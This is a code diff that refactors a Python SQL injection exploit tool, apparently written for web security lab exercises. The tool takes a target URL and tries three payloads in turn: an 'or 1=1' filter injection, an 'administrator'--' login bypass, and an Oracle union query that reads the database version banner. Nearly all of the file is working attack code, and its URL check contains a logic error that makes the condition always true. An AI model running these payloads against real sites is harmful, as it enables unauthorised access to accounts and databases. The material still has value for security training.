@@ -1,21 +1,17 @@
-import requests, re, dotenv, sys
-from pathlib import Path
-
-PYTHON_PATH = Path(__file__).parent.parent
-
-sys.path.append(str(PYTHON_PATH))
-from config import parse_args, is_success
-args, proxy = parse_args()
-
-
-dotenv.load_dotenv(dotenv_path="../.env")
+try:
+    import requests, re, dotenv, sys
+    from pathlib import Path
+    sys.path.append(str(Path(__file__).parent.parent))
+    from config import parse_args, is_success
+except ImportError as e:
+    print(e)
 
 class Sqli:
     def __init__(self, url):
         self.url = url.rstrip("/")
         self.login_url = f"{self.url}/login"
         self.session = requests.Session()
-
+        args, proxy = parse_args()
         if proxy:
             self.session.proxies.update(proxy)  
         self.session.verify = False
@@ -72,41 +68,55 @@ class Sqli:
             return False
 
     def released_sqli(self):
-        print("Trying released sqli")
-        exploit_result = self.session.get(url=f"{self.url}/filter?category=' or 1=1 --")
-        if exploit_result.status_code != 200:
+        try:
+            print("Trying released sqli")
+            exploit_result = self.session.get(url=f"{self.url}/filter?category=' or 1=1 --")
+            if exploit_result.status_code != 200:
+                return False
+            
+            if not is_success(self):
+                return False 
+            print("Exploit successfull.\nPayload: or 1=1 --")  
+            return True
+        except Exception as e:
+            print(f"{e}")
             return False
         
-        if not is_success(self):
-            return False 
-        
-        print("Exploit successfull.\nPayload: or 1=1 --")  
-        return True
     
     def sqli_login_bypass(self):
-        print("Trying sqli login bypass")
-        login_post_status = self.login("administrator'--", "hi")
-        login_get_status = self.check_login()
-        if not login_post_status and not login_get_status:
+        try:
+            print("Trying sqli login bypass")
+            login_post_status = self.login("administrator'--", "hi")
+            login_get_status = self.check_login()
+            if not login_post_status and not login_get_status:
+                return False
+            
+            if not is_success(self):
+                return False 
+            
+            print("Exploit successfull.\nPayload: administrator'--")
+            return True
+        except Exception as e:
+            print(f"{e}")
             return False
-        
-        if not is_success(self):
-            return False 
-        
-        print("Exploit successfull.\nPayload: administrator'--")
-        return True
     
     def oracle_database(self):
-        exploit_result = self.session.get(url=f"{self.url}/filter?category=' union select null, banner from v$version --")
-        if exploit_result.status_code != 200:
-            return False
-        
-        if not is_success(self):
-            return False 
+        try:
+            exploit_result = self.session.get(url=f"{self.url}/filter?category=' union select null, banner from v$version --")
+            if exploit_result.status_code != 200:
+                return False
+            
+            if not is_success(self):
+                return False 
 
-        print("Exploit successfull. \nPayload: union select null, banner from v$version --")
+            print("Exploit successfull. \nPayload: union select null, banner from v$version --")
+            return True
+        except Exception as e:
+            print(f"{e}")
+            return False
     
     def main(self):
+        dotenv.load_dotenv(dotenv_path="../.env")
         exploit_methods = [
             ("released_sqli", self.released_sqli),
             ("login_bypass", self.sqli_login_bypass),
@@ -128,9 +138,10 @@ class Sqli:
         print("All exploits failed. Sorry you will have to search for better programmer than me. (╥﹏╥)")
         return False
         
-url = input("Enter the url: ")
-if url is not None or url != "":
-    sqli = Sqli(url)
-    sqli.main()
-else:
-    print("Please enter the url")
+if __name__ == "__main__":
+    url = input("Enter the url: ")
+    if url is not None or url != "":
+        sqli = Sqli(url)
+        sqli.main()
+    else:
+        print("Please enter the url")
